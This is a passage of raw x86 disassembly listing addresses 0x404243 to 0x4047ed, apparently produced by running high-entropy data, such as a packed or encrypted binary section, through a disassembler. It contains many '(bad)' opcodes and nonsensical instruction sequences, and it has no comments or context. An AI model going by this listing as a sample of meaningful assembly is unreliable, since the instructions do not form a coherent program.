  404243:	e7 7d                	out    %eax,$0x7d
  404245:	12 4e 8d             	adc    -0x73(%esi),%cl
  404248:	04 51                	add    $0x51,%al
  40424a:	f6 83 e6 f0 7f 45 08 	testb  $0x8,0x457ff0e6(%ebx)
  404251:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404252:	29 6d 88             	sub    %ebp,-0x78(%ebp)
  404255:	b7 d5                	mov    $0xd5,%bh
  404257:	26 c7                	es (bad)
  404259:	eb 88                	jmp    0x4041e3
  40425b:	00 1b                	add    %bl,(%ebx)
  40425d:	8b be 7b 12 14 41    	mov    0x4114127b(%esi),%edi
  404263:	8e 75 00             	mov    0x0(%ebp),%?
  404266:	6e                   	outsb  %ds:(%esi),(%dx)
  404267:	99                   	cltd
  404268:	ef                   	out    %eax,(%dx)
  404269:	34 81                	xor    $0x81,%al
  40426b:	5b                   	pop    %ebx
  40426c:	73 1f                	jae    0x40428d
  40426e:	45                   	inc    %ebp
  40426f:	31 c6                	xor    %eax,%esi
  404271:	f7 88 be b8 a4 52 fe 	testl  $0x608451fe,0x52a4b8be(%eax)
  404278:	51 84 60 
  40427b:	26 ae                	es scas %es:(%edi),%al
  40427d:	0b 90 0a eb 2d 2b    	or     0x2b2deb0a(%eax),%edx
  404283:	47                   	inc    %edi
  404284:	2b 81 f8 76 c6 6b    	sub    0x6bc676f8(%ecx),%eax
  40428a:	3d 4f 17 2f af       	cmp    $0xaf2f174f,%eax
  40428f:	54                   	push   %esp
  404290:	ce                   	into
  404291:	86 c7                	xchg   %al,%bh
  404293:	8f e9 c8 58          	(bad)
  404297:	5a                   	pop    %edx
  404298:	6d                   	insl   (%dx),%es:(%edi)
  404299:	98                   	cwtl
  40429a:	94                   	xchg   %eax,%esp
  40429b:	63 1e                	arpl   %ebx,(%esi)
  40429d:	79 7a                	jns    0x404319
  40429f:	39 e0                	cmp    %esp,%eax
  4042a1:	03 e8                	add    %eax,%ebp
  4042a3:	9c                   	pushf
  4042a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4042a5:	dd 3a                	fnstsw (%edx)
  4042a7:	e5 15                	in     $0x15,%eax
  4042a9:	af                   	scas   %es:(%edi),%eax
  4042aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4042ab:	bf ca 4c 97 05       	mov    $0x5974cca,%edi
  4042b0:	18 32                	sbb    %dh,(%edx)
  4042b2:	98                   	cwtl
  4042b3:	a8 38                	test   $0x38,%al
  4042b5:	cd ee                	int    $0xee
  4042b7:	a1 c6 2e f3 62       	mov    0x62f32ec6,%eax
  4042bc:	b3 10                	mov    $0x10,%bl
  4042be:	90                   	nop
  4042bf:	16                   	push   %ss
  4042c0:	6a b4                	push   $0xffffffb4
  4042c2:	8d 12                	lea    (%edx),%edx
  4042c4:	7f 39                	jg     0x4042ff
  4042c6:	0a 64 d1 ba          	or     -0x46(%ecx,%edx,8),%ah
  4042ca:	1c e9                	sbb    $0xe9,%al
  4042cc:	b5 aa                	mov    $0xaa,%ch
  4042ce:	8d                   	lea    (bad),%edx
  4042cf:	d5 a2                	aad    $0xa2
  4042d1:	a0 59 41 9a 03       	mov    0x39a4159,%al
  4042d6:	9d                   	popf
  4042d7:	69 e2 b4 a0 94 14    	imul   $0x1494a0b4,%edx,%esp
  4042dd:	3a 42 27             	cmp    0x27(%edx),%al
  4042e0:	71 d4                	jno    0x4042b6
  4042e2:	73 de                	jae    0x4042c2
  4042e4:	fd                   	std
  4042e5:	65 13 8e c1 13 22 53 	adc    %gs:0x532213c1(%esi),%ecx
  4042ec:	5c                   	pop    %esp
  4042ed:	21 d5                	and    %edx,%ebp
  4042ef:	3d bf f1 13 ad       	cmp    $0xad13f1bf,%eax
  4042f4:	0a af 33 1e c7 c1    	or     -0x3e38e1cd(%edi),%ch
  4042fa:	d9 5b 09             	fstps  0x9(%ebx)
  4042fd:	11 3f                	adc    %edi,(%edi)
  4042ff:	8f                   	(bad)
  404300:	b1 ec                	mov    $0xec,%cl
  404302:	5d                   	pop    %ebp
  404303:	9e                   	sahf
  404304:	15 dc 0f b8 96       	adc    $0x96b80fdc,%eax
  404309:	dd 43 95             	fldl   -0x6b(%ebx)
  40430c:	ac                   	lods   %ds:(%esi),%al
  40430d:	3b 03                	cmp    (%ebx),%eax
  40430f:	f7 e7                	mul    %edi
  404311:	9d                   	popf
  404312:	dc b7 47 6b 6c 7f    	fdivl  0x7f6c6b47(%edi)
  404318:	94                   	xchg   %eax,%esp
  404319:	1f                   	pop    %ds
  40431a:	ff 74 22 a0          	push   -0x60(%edx,%eiz,1)
  40431e:	99                   	cltd
  40431f:	92                   	xchg   %eax,%edx
  404320:	31 6f 07             	xor    %ebp,0x7(%edi)
  404323:	5e                   	pop    %esi
  404324:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404325:	1e                   	push   %ds
  404326:	d3 7f 99             	sarl   %cl,-0x67(%edi)
  404329:	c4 42 65             	les    0x65(%edx),%eax
  40432c:	55                   	push   %ebp
  40432d:	7d 16                	jge    0x404345
  40432f:	79 0f                	jns    0x404340
  404331:	fe                   	(bad)
  404332:	d0 ae 05 1e dc d5    	shrb   $1,-0x2a23e1fb(%esi)
  404338:	0b e0                	or     %eax,%esp
  40433a:	84 76 91             	test   %dh,-0x6f(%esi)
  40433d:	3d cf bf 13 55       	cmp    $0x5513bfcf,%eax
  404342:	af                   	scas   %es:(%edi),%eax
  404343:	c2 f4 a5             	ret    $0xa5f4
  404346:	6d                   	insl   (%dx),%es:(%edi)
  404347:	c8 1e e1 df          	enter  $0xe11e,$0xdf
  40434b:	b4 28                	mov    $0x28,%ah
  40434d:	f5                   	cmc
  40434e:	9b                   	fwait
  40434f:	55                   	push   %ebp
  404350:	b8 52 74 32 01       	mov    $0x1327452,%eax
  404355:	f9                   	stc
  404356:	df 86 05 cd a1 07    	filds  0x7a1cd05(%esi)
  40435c:	7a 9e                	jp     0x4042fc
  40435e:	0b 66 ad             	or     -0x53(%esi),%esp
  404361:	3a c6                	cmp    %dh,%al
  404363:	bd 07 6c 6e 74       	mov    $0x746e6c07,%ebp
  404368:	7f 26                	jg     0x404390
  40436a:	c7                   	(bad)
  40436b:	f9                   	stc
  40436c:	54                   	push   %esp
  40436d:	54                   	push   %esp
  40436e:	89 fe                	mov    %edi,%esi
  404370:	89 d0                	mov    %edx,%eax
  404372:	d6                   	salc
  404373:	31 12                	xor    %edx,(%edx)
  404375:	9f                   	lahf
  404376:	b0 db                	mov    $0xdb,%al
  404378:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404379:	c7                   	(bad)
  40437a:	14 eb                	adc    $0xeb,%al
  40437c:	b4 eb                	mov    $0xeb,%ah
  40437e:	f7 ae e6 1f 0f 8a    	imull  -0x75f0e01a(%esi)
  404384:	ed                   	in     (%dx),%eax
  404385:	ca bc e2             	lret   $0xe2bc
  404388:	5a                   	pop    %edx
  404389:	4f                   	dec    %edi
  40438a:	40                   	inc    %eax
  40438b:	71 31                	jno    0x4043be
  40438d:	23 10                	and    (%eax),%edx
  40438f:	43                   	inc    %ebx
  404390:	0a 77 3f             	or     0x3f(%edi),%dh
  404393:	cb                   	lret
  404394:	7e bd                	jle    0x404353
  404396:	be b1 0d 20 d5       	mov    $0xd5200db1,%esi
  40439b:	73 cd                	jae    0x40436a
  40439d:	e9 ca f1 16 a9       	jmp    0xa957356c
  4043a2:	fd                   	std
  4043a3:	91                   	xchg   %eax,%ecx
  4043a4:	81 bf 4e fd 1a ea 1e 	cmpl   $0x37aaf1e,-0x15e502b2(%edi)
  4043ab:	af 7a 03 
  4043ae:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4043af:	8b 81 27 62 76 50    	mov    0x50766227(%ecx),%eax
  4043b5:	f6 da                	neg    %dl
  4043b7:	55                   	push   %ebp
  4043b8:	be 55 5f 6d 12       	mov    $0x126d5f55,%esi
  4043bd:	45                   	inc    %ebp
  4043be:	b0 55                	mov    $0x55,%al
  4043c0:	f0 3e aa             	lock ds stos %al,%es:(%edi)
  4043c3:	83 dc 30             	sbb    $0x30,%esp
  4043c6:	01 5b b7             	add    %ebx,-0x49(%ebx)
  4043c9:	56                   	push   %esi
  4043ca:	49                   	dec    %ecx
  4043cb:	3e a6                	cmpsb  %es:(%edi),%ds:(%esi)
  4043cd:	a0 11 0b ef b9       	mov    0xb9ef0b11,%al
  4043d2:	16                   	push   %ss
  4043d3:	5a                   	pop    %edx
  4043d4:	a0 48 64 ca 29       	mov    0x29ca6448,%al
  4043d9:	ae                   	scas   %es:(%edi),%al
  4043da:	8a 68 c8             	mov    -0x38(%eax),%ch
  4043dd:	e4 61                	in     $0x61,%al
  4043df:	43                   	inc    %ebx
  4043e0:	04 9b                	add    $0x9b,%al
  4043e2:	72 e7                	jb     0x4043cb
  4043e4:	83 87 e6 a7 58 0e a8 	addl   $0xffffffa8,0xe58a7e6(%edi)
  4043eb:	42                   	inc    %edx
  4043ec:	1b 01                	sbb    (%ecx),%eax
  4043ee:	0e                   	push   %cs
  4043ef:	a3 d9 10 20 61       	mov    %eax,0x612010d9
  4043f4:	59                   	pop    %ecx
  4043f5:	c1 d1 60             	rcl    $0x60,%ecx
  4043f8:	08 f8                	or     %bh,%al
  4043fa:	cd 02                	int    $0x2
  4043fc:	06                   	push   %es
  4043fd:	7f dc                	jg     0x4043db
  4043ff:	22 ce                	and    %dh,%cl
  404401:	c8 2c fc 17          	enter  $0xfc2c,$0x17
  404405:	48                   	dec    %eax
  404406:	0e                   	push   %cs
  404407:	81 4b 7e 1b 98 72 bc 	orl    $0xbc72981b,0x7e(%ebx)
  40440e:	dd 8f ce f0 46 22    	fisttpll 0x2246f0ce(%edi)
  404414:	f3 0e                	repz push %cs
  404416:	33 ba 98 dc f1 7f    	xor    0x7ff1dc98(%edx),%edi
  40441c:	40                   	inc    %eax
  40441d:	88 1e                	mov    %bl,(%esi)
  40441f:	29 ad 2d 3e c7 4c    	sub    %ebp,0x4cc73e2d(%ebp)
  404425:	cd 00                	int    $0x0
  404427:	5a                   	pop    %edx
  404428:	cd 73                	int    $0x73
  40442a:	e4 69                	in     $0x69,%al
  40442c:	67 ab                	stos   %eax,%es:(%di)
  40442e:	bd 99 d2 7b 46       	mov    $0x467bd299,%ebp
  404433:	c7                   	(bad)
  404434:	4e                   	dec    %esi
  404435:	de 11                	ficoms (%ecx)
  404437:	21 71 7a             	and    %esi,0x7a(%ecx)
  40443a:	d1 c7                	rol    $1,%edi
  40443c:	3e dd 93 d2 d1 21 55 	fstl   %ds:0x5521d1d2(%ebx)
  404443:	ee                   	out    %al,(%dx)
  404444:	6a ef                	push   $0xffffffef
  404446:	14 b6                	adc    $0xb6,%al
  404448:	97                   	xchg   %eax,%edi
  404449:	bf a9 16 d5 d4       	mov    $0xd4d516a9,%edi
  40444e:	ac                   	lods   %ds:(%esi),%al
  40444f:	b0 ed                	mov    $0xed,%al
  404451:	81 84 6f a4 56 9d ac 	addl   $0x54437ef,-0x5362a95c(%edi,%ebp,2)
  404458:	ef 37 44 05 
  40445c:	4c                   	dec    %esp
  40445d:	ab                   	stos   %eax,%es:(%edi)
  40445e:	70 2a                	jo     0x40448a
  404460:	95                   	xchg   %eax,%ebp
  404461:	d6                   	salc
  404462:	3c ad                	cmp    $0xad,%al
  404464:	96                   	xchg   %eax,%esi
  404465:	31 be ef cc 67 59    	xor    %edi,0x5967ccef(%esi)
  40446b:	83 f3 8f             	xor    $0xffffff8f,%ebx
  40446e:	1d ff 9c 0f a9       	sbb    $0xa90f9cff,%eax
  404473:	f7 e1                	mul    %ecx
  404475:	dc fa                	fdivr  %st,%st(2)
  404477:	cc                   	int3
  404478:	88 7d ca             	mov    %bh,-0x36(%ebp)
  40447b:	2d ab d2 fd 29       	sub    $0x29fdd2ab,%eax
  404480:	ff 70 17             	push   0x17(%eax)
  404483:	7e 9f                	jle    0x404424
  404485:	cf                   	iret
  404486:	7a 91                	jp     0x404419
  404488:	0d 09 a5 14 49       	or     $0x4914a509,%eax
  40448d:	cc                   	int3
  40448e:	d4 63                	aam    $0x63
  404490:	4b                   	dec    %ebx
  404491:	8c e4                	mov    %fs,%esp
  404493:	fa                   	cli
  404494:	dc 1f                	fcompl (%edi)
  404496:	95                   	xchg   %eax,%ebp
  404497:	42                   	inc    %edx
  404498:	0d 46 a1 95 6b       	or     $0x6b95a146,%eax
  40449d:	da e5                	(bad)
  40449f:	5d                   	pop    %ebp
  4044a0:	d3 8a c2 dd fd c3    	rorl   %cl,-0x3c02223e(%edx)
  4044a6:	89 cc                	mov    %ecx,%esp
  4044a8:	fe                   	(bad)
  4044a9:	56                   	push   %esi
  4044aa:	80 96 7a f4 e5 86 2a 	adcb   $0x2a,-0x791a0b86(%esi)
  4044b1:	bb 3b 44 43 6b       	mov    $0x6b43443b,%ebx
  4044b6:	e5 08                	in     $0x8,%eax
  4044b8:	d0 e0                	shl    $1,%al
  4044ba:	70 d2                	jo     0x40448e
  4044bc:	11 fd                	adc    %edi,%ebp
  4044be:	cd ad                	int    $0xad
  4044c0:	dd 28                	(bad) (%eax)
  4044c2:	d9 e5                	fxam
  4044c4:	fc                   	cld
  4044c5:	8d                   	lea    (bad),%ebp
  4044c6:	eb 4d                	jmp    0x404515
  4044c8:	8d 07                	lea    (%edi),%eax
  4044ca:	ad                   	lods   %ds:(%esi),%eax
  4044cb:	ae                   	scas   %es:(%edi),%al
  4044cc:	03 64 e2 1d          	add    0x1d(%edx,%eiz,8),%esp
  4044d0:	39 91 fb 0b ae 67    	cmp    %edx,0x67ae0bfb(%ecx)
  4044d6:	c9                   	leave
  4044d7:	f5                   	cmc
  4044d8:	26 21 db             	es and %ebx,%ebx
  4044db:	b9 41 b0 e1 cb       	mov    $0xcbe1b041,%ecx
  4044e0:	97                   	xchg   %eax,%edi
  4044e1:	4d                   	dec    %ebp
  4044e2:	78 25                	js     0x404509
  4044e4:	aa                   	stos   %al,%es:(%edi)
  4044e5:	dc 03                	faddl  (%ebx)
  4044e7:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4044e8:	88 55 5f             	mov    %dl,0x5f(%ebp)
  4044eb:	78 40                	js     0x40452d
  4044ed:	9f                   	lahf
  4044ee:	91                   	xchg   %eax,%ecx
  4044ef:	09 39                	or     %edi,(%ecx)
  4044f1:	bf bd 17 ae c5       	mov    $0xc5ae17bd,%edi
  4044f6:	75 77                	jne    0x40456f
  4044f8:	b5 ba                	mov    $0xba,%ch
  4044fa:	08 dd                	or     %bl,%ch
  4044fc:	c9                   	leave
  4044fd:	70 62                	jo     0x404561
  4044ff:	2c 5b                	sub    $0x5b,%al
  404501:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404502:	b7 10                	mov    $0x10,%bh
  404504:	76 3a                	jbe    0x404540
  404506:	96                   	xchg   %eax,%esi
  404507:	38 b0 e1 48 5a f9    	cmp    %dh,-0x6a5b71f(%eax)
  40450d:	a3 8f 67 1d db       	mov    %eax,0xdb1d678f
  404512:	f2 fc                	repnz cld
  404514:	80 5d 97 1f          	sbbb   $0x1f,-0x69(%ebp)
  404518:	c3                   	ret
  404519:	b8 e0 0e e5 f9       	mov    $0xf9e50ee0,%eax
  40451e:	8d                   	lea    (bad),%edx
  40451f:	d0 63 41             	shlb   $1,0x41(%ebx)
  404522:	41                   	inc    %ecx
  404523:	be de f5 27 dd       	mov    $0xdd27f5de,%esi
  404528:	92                   	xchg   %eax,%edx
  404529:	84 31                	test   %dh,(%ecx)
  40452b:	8c 8d b2 bc 10 b5    	mov    %cs,-0x4aef434e(%ebp)
  404531:	05 51 cd 7e 81       	add    $0x817ecd51,%eax
  404536:	b9 96 58 dd c2       	mov    $0xc2dd5896,%ecx
  40453b:	cf                   	iret
  40453c:	20 04 7d 21 8f ca 23 	and    %al,0x23ca8f21(,%edi,2)
  404543:	55                   	push   %ebp
  404544:	27                   	daa
  404545:	14 9b                	adc    $0x9b,%al
  404547:	af                   	scas   %es:(%edi),%eax
  404548:	6e                   	outsb  %ds:(%esi),(%dx)
  404549:	ac                   	lods   %ds:(%esi),%al
  40454a:	c0 07 3b             	rolb   $0x3b,(%edi)
  40454d:	ee                   	out    %al,(%dx)
  40454e:	46                   	inc    %esi
  40454f:	ff 9b 30 16 54 05    	lcall  *0x5541630(%ebx)
  404555:	4e                   	dec    %esi
  404556:	4e                   	dec    %esi
  404557:	62 35 d8 0b 47 6f    	bound  %esi,0x6f470bd8
  40455d:	07                   	pop    %es
  40455e:	9b                   	fwait
  40455f:	f4                   	hlt
  404560:	1d 47 18 bc 85       	sbb    $0x85bc1847,%eax
  404565:	72 db                	jb     0x404542
  404567:	69 48 6a 2d 37 56 b1 	imul   $0xb156372d,0x6a(%eax),%ecx
  40456e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40456f:	b8 27 ef 93 f5       	mov    $0xf593ef27,%eax
  404574:	15 d9 6a dc 77       	adc    $0x77dc6ad9,%eax
  404579:	5c                   	pop    %esp
  40457a:	e8 3f cb bd 2d       	call   0x2dfe10be
  40457f:	99                   	cltd
  404580:	0f eb 1f             	por    (%edi),%mm3
  404583:	bf 20 de 0b 05       	mov    $0x50bde20,%edi
  404588:	7c 70                	jl     0x4045fa
  40458a:	76 15                	jbe    0x4045a1
  40458c:	87 24 b1             	xchg   %esp,(%ecx,%esi,4)
  40458f:	d3 f8                	sar    %cl,%eax
  404591:	32 01                	xor    (%ecx),%al
  404593:	c3                   	ret
  404594:	3f                   	aas
  404595:	79 93                	jns    0x40452a
  404597:	87 2f                	xchg   %ebp,(%edi)
  404599:	ed                   	in     (%dx),%eax
  40459a:	aa                   	stos   %al,%es:(%edi)
  40459b:	5c                   	pop    %esp
  40459c:	05 11 26 03 21       	add    $0x21032611,%eax
  4045a1:	2e af                	cs scas %es:(%edi),%eax
  4045a3:	a8 3a                	test   $0x3a,%al
  4045a5:	ee                   	out    %al,(%dx)
  4045a6:	dc ac 08 66 40 15 2c 	fsubrl 0x2c154066(%eax,%ecx,1)
  4045ad:	8a 8a 46 b0 4f 2e    	mov    0x2e4fb046(%edx),%cl
  4045b3:	7c 74                	jl     0x404629
  4045b5:	58                   	pop    %eax
  4045b6:	2f                   	das
  4045b7:	05 60 8b a2 8f       	add    $0x8fa28b60,%eax
  4045bc:	1b 6c 00 a2          	sbb    -0x5e(%eax,%eax,1),%ebp
  4045c0:	fd                   	std
  4045c1:	12 78 3f             	adc    0x3f(%eax),%bh
  4045c4:	5b                   	pop    %ebx
  4045c5:	c3                   	ret
  4045c6:	48                   	dec    %eax
  4045c7:	ca d5 22             	lret   $0x22d5
  4045ca:	9c                   	pushf
  4045cb:	46                   	inc    %esi
  4045cc:	c9                   	leave
  4045cd:	b6 83                	mov    $0x83,%dh
  4045cf:	91                   	xchg   %eax,%ecx
  4045d0:	a8 8b                	test   $0x8b,%al
  4045d2:	32 b4 d2 ad 93 b3 c7 	xor    -0x384c6c53(%edx,%edx,8),%dh
  4045d9:	56                   	push   %esi
  4045da:	f4                   	hlt
  4045db:	69 cb 62 56 43 0a    	imul   $0xa435662,%ebx,%ecx
  4045e1:	69 e1 0b de 6e c5    	imul   $0xc56ede0b,%ecx,%esp
  4045e7:	c4                   	(bad)
  4045e8:	e0 ce                	loopne 0x4045b8
  4045ea:	89 00                	mov    %eax,(%eax)
  4045ec:	85 ea                	test   %ebp,%edx
  4045ee:	ab                   	stos   %eax,%es:(%edi)
  4045ef:	8c 84 b2 44 ec 58 31 	mov    %es,0x3158ec44(%edx,%esi,4)
  4045f6:	ab                   	stos   %eax,%es:(%edi)
  4045f7:	10 15 31 4e a9 d3    	adc    %dl,0xd3a94e31
  4045fd:	c5 cb 9a             	(bad)
  404600:	32 b3 64 40 f4 80    	xor    -0x7f0bbf9c(%ebx),%dh
  404606:	ff b2 ca 3d e3 5f    	push   0x5fe33dca(%edx)
  40460c:	63 c3                	arpl   %eax,%ebx
  40460e:	e5 53                	in     $0x53,%eax
  404610:	92                   	xchg   %eax,%edx
  404611:	33 f3                	xor    %ebx,%esi
  404613:	3f                   	aas
  404614:	a9 b5 e2 8c 36       	test   $0x368ce2b5,%eax
  404619:	69 53 ba 31 5d e9 43 	imul   $0x43e95d31,-0x46(%ebx),%edx
  404620:	89 be 4c f4 e0 ed    	mov    %edi,-0x121f0bb4(%esi)
  404626:	7f eb                	jg     0x404613
  404628:	4d                   	dec    %ebp
  404629:	5a                   	pop    %edx
  40462a:	4b                   	dec    %ebx
  40462b:	38 0a                	cmp    %cl,(%edx)
  40462d:	99                   	cltd
  40462e:	9b                   	fwait
  40462f:	f1                   	int1
  404630:	f0 84 4b 1e          	lock test %cl,0x1e(%ebx)
  404634:	fd                   	std
  404635:	22 a7 ff a4 f9 aa    	and    -0x55065b01(%edi),%ah
  40463b:	62 c7 5f 08 56       	(bad)
  404640:	8e b6 6a a4 81 a4    	mov    -0x5b7e5b96(%esi),%?
  404646:	05 d7 5f 1d 48       	add    $0x481d5fd7,%eax
  40464b:	ee                   	out    %al,(%dx)
  40464c:	66 cb                	lretw
  40464e:	5b                   	pop    %ebx
  40464f:	86 7f dd             	xchg   %bh,-0x23(%edi)
  404652:	e2 fb                	loop   0x40464f
  404654:	40                   	inc    %eax
  404655:	d9 44 8c c5          	flds   -0x3b(%esp,%ecx,4)
  404659:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40465a:	38 38                	cmp    %bh,(%eax)
  40465c:	53                   	push   %ebx
  40465d:	5c                   	pop    %esp
  40465e:	f3 95                	repz xchg %eax,%ebp
  404660:	19 5e 08             	sbb    %ebx,0x8(%esi)
  404663:	63 7a 75             	arpl   %edi,0x75(%edx)
  404666:	25 c0 36 c5 80       	and    $0x80c536c0,%eax
  40466b:	a0 d9 e3 31 f2       	mov    0xf231e3d9,%al
  404670:	56                   	push   %esi
  404671:	53                   	push   %ebx
  404672:	36 6d                	ss insl (%dx),%es:(%edi)
  404674:	11 e6                	adc    %esp,%esi
  404676:	2c 72                	sub    $0x72,%al
  404678:	10 d0                	adc    %dl,%al
  40467a:	71 6b                	jno    0x4046e7
  40467c:	57                   	push   %edi
  40467d:	4f                   	dec    %edi
  40467e:	09 c7                	or     %eax,%edi
  404680:	18 e0                	sbb    %ah,%al
  404682:	a2 ec 5c a2 07       	mov    %al,0x7a25cec
  404687:	c5 11                	lds    (%ecx),%edx
  404689:	ca bf b3             	lret   $0xb3bf
  40468c:	cd 06                	int    $0x6
  40468e:	44                   	inc    %esp
  40468f:	91                   	xchg   %eax,%ecx
  404690:	99                   	cltd
  404691:	9b                   	fwait
  404692:	b0 f0                	mov    $0xf0,%al
  404694:	a0 db bb af 20       	mov    0x20afbbdb,%al
  404699:	8a ac 9c ae fb d8 c1 	mov    -0x3e270452(%esp,%ebx,4),%ch
  4046a0:	88 7b e2             	mov    %bh,-0x1e(%ebx)
  4046a3:	d5 e4                	aad    $0xe4
  4046a5:	15 dc e8 c6 e3       	adc    $0xe3c6e8dc,%eax
  4046aa:	52                   	push   %edx
  4046ab:	51                   	push   %ecx
  4046ac:	4c                   	dec    %esp
  4046ad:	88 62 3e             	mov    %ah,0x3e(%edx)
  4046b0:	f7 56 b1             	notl   -0x4f(%esi)
  4046b3:	4f                   	dec    %edi
  4046b4:	28 51 03             	sub    %dl,0x3(%ecx)
  4046b7:	67 40                	addr16 inc %eax
  4046b9:	1a c5                	sbb    %ch,%al
  4046bb:	9f                   	lahf
  4046bc:	81 b6 43 bc b9 e2 b6 	xorl   $0xf424f7b6,-0x1d4643bd(%esi)
  4046c3:	f7 24 f4 
  4046c6:	fb                   	sti
  4046c7:	0d b7 2a b2 ad       	or     $0xadb22ab7,%eax
  4046cc:	1b 1e                	sbb    (%esi),%ebx
  4046ce:	4e                   	dec    %esi
  4046cf:	b4 57                	mov    $0x57,%ah
  4046d1:	11 69 b5             	adc    %ebp,-0x4b(%ecx)
  4046d4:	de 6c e7 46          	fisubrs 0x46(%edi,%eiz,8)
  4046d8:	60                   	pusha
  4046d9:	de f4                	fdivp  %st,%st(4)
  4046db:	53                   	push   %ebx
  4046dc:	bc f3 a3 c5 13       	mov    $0x13c5a3f3,%esp
  4046e1:	14 58                	adc    $0x58,%al
  4046e3:	93                   	xchg   %eax,%ebx
  4046e4:	0d 43 23 96 f8       	or     $0xf8962343,%eax
  4046e9:	ef                   	out    %eax,(%dx)
  4046ea:	3f                   	aas
  4046eb:	38 84 a6 21 c8 b1 e3 	cmp    %al,-0x1c4e37df(%esi,%eiz,4)
  4046f2:	55                   	push   %ebp
  4046f3:	6d                   	insl   (%dx),%es:(%edi)
  4046f4:	6a 1b                	push   $0x1b
  4046f6:	16                   	push   %ss
  4046f7:	bf e3 63 44 0b       	mov    $0xb4463e3,%edi
  4046fc:	d5 cd                	aad    $0xcd
  4046fe:	1d 2c 29 19 d1       	sbb    $0xd119292c,%eax
  404703:	7b 98                	jnp    0x40469d
  404705:	b6 57                	mov    $0x57,%dh
  404707:	35 f3 87 d0 07       	xor    $0x7d087f3,%eax
  40470c:	5e                   	pop    %esi
  40470d:	7a 31                	jp     0x404740
  40470f:	fe                   	(bad)
  404710:	5c                   	pop    %esp
  404711:	1a 98 1c 51 bd 9a    	sbb    -0x6542aee4(%eax),%bl
  404717:	4c                   	dec    %esp
  404718:	f0 3d 60 c1 cc 13    	lock cmp $0x13ccc160,%eax
  40471e:	c1 0e 64             	rorl   $0x64,(%esi)
  404721:	7b df                	jnp    0x404702
  404723:	f3 4e                	repz dec %esi
  404725:	66 2b 43 7d          	sub    0x7d(%ebx),%ax
  404729:	32 f5                	xor    %ch,%dh
  40472b:	95                   	xchg   %eax,%ebp
  40472c:	bc 35 13 93 a5       	mov    $0xa5931335,%esp
  404731:	5d                   	pop    %ebp
  404732:	2c d1                	sub    $0xd1,%al
  404734:	61                   	popa
  404735:	94                   	xchg   %eax,%esp
  404736:	ff 36                	push   (%esi)
  404738:	e1 d9                	loope  0x404713
  40473a:	3c d6                	cmp    $0xd6,%al
  40473c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40473d:	4b                   	dec    %ebx
  40473e:	95                   	xchg   %eax,%ebp
  40473f:	55                   	push   %ebp
  404740:	69 ca a7 45 48 5a    	imul   $0x5a4845a7,%edx,%ecx
  404746:	a8 1d                	test   $0x1d,%al
  404748:	11 b8 8b db 97 de    	adc    %edi,-0x21682475(%eax)
  40474e:	d4 0d                	aam    $0xd
  404750:	22 46 06             	and    0x6(%esi),%al
  404753:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404754:	1a fb                	sbb    %bl,%bh
  404756:	61                   	popa
  404757:	62 6b 3e             	bound  %ebp,0x3e(%ebx)
  40475a:	ea c2 7e 4c b2 bd b1 	ljmp   $0xb1bd,$0xb24c7ec2
  404761:	c5 cc b3             	(bad)
  404764:	57                   	push   %edi
  404765:	2e 36 4d             	cs ss dec %ebp
  404768:	1e                   	push   %ds
  404769:	b4 db                	mov    $0xdb,%ah
  40476b:	c6                   	(bad)
  40476c:	3f                   	aas
  40476d:	c8 fd ce a6          	enter  $0xcefd,$0xa6
  404771:	f0 e2 17             	lock loop 0x40478b
  404774:	45                   	inc    %ebp
  404775:	0b af 80 5a 30 d3    	or     -0x2ccfa580(%edi),%ebp
  40477b:	27                   	daa
  40477c:	e7 f5                	out    %eax,$0xf5
  40477e:	98                   	cwtl
  40477f:	85 5e 7b             	test   %ebx,0x7b(%esi)
  404782:	c4                   	(bad)
  404783:	fe 4b d5             	decb   -0x2b(%ebx)
  404786:	76 e9                	jbe    0x404771
  404788:	1f                   	pop    %ds
  404789:	5f                   	pop    %edi
  40478a:	36 26 d5 7b          	ss es aad $0x7b
  40478e:	7d 03                	jge    0x404793
  404790:	28 6f 8a             	sub    %ch,-0x76(%edi)
  404793:	df 46 ad             	filds  -0x53(%esi)
  404796:	ec                   	in     (%dx),%al
  404797:	55                   	push   %ebp
  404798:	8d 77 1e             	lea    0x1e(%edi),%esi
  40479b:	b4 d3                	mov    $0xd3,%ah
  40479d:	ec                   	in     (%dx),%al
  40479e:	13 ce                	adc    %esi,%ecx
  4047a0:	d0 32                	shlb   $1,(%edx)
  4047a2:	ea df 96 d2 a8 b2 15 	ljmp   $0x15b2,$0xa8d296df
  4047a9:	52                   	push   %edx
  4047aa:	e9 9f 8f d8 d0       	jmp    0xd118d74e
  4047af:	74 6f                	je     0x404820
  4047b1:	9d                   	popf
  4047b2:	10 29                	adc    %ch,(%ecx)
  4047b4:	06                   	push   %es
  4047b5:	13 6a 77             	adc    0x77(%edx),%ebp
  4047b8:	1a bf 75 2f 8e 90    	sbb    -0x6f71d08b(%edi),%bh
  4047be:	92                   	xchg   %eax,%edx
  4047bf:	50                   	push   %eax
  4047c0:	bf 83 60 55 45       	mov    $0x45556083,%edi
  4047c5:	ce                   	into
  4047c6:	89 b9 0a 32 f8 d1    	mov    %edi,-0x2e07cdf6(%ecx)
  4047cc:	28 5a 08             	sub    %bl,0x8(%edx)
  4047cf:	29 01                	sub    %eax,(%ecx)
  4047d1:	33 0e                	xor    (%esi),%ecx
  4047d3:	58                   	pop    %eax
  4047d4:	2c 7e                	sub    $0x7e,%al
  4047d6:	9d                   	popf
  4047d7:	cb                   	lret
  4047d8:	c9                   	leave
  4047d9:	47                   	inc    %edi
  4047da:	f7 3d 2f 32 52 6f    	idivl  0x6f52322f
  4047e0:	d7                   	xlat   %ds:(%ebx)
  4047e1:	f5                   	cmc
  4047e2:	13 e7                	adc    %edi,%esp
  4047e4:	46                   	inc    %esi
  4047e5:	11 c1                	adc    %eax,%ecx
  4047e7:	62 78 db             	bound  %edi,-0x25(%eax)
  4047ea:	ed                   	in     (%dx),%eax
  4047eb:	7b 28                	jnp    0x404815
  4047ed:	4c                   	dec    %esp
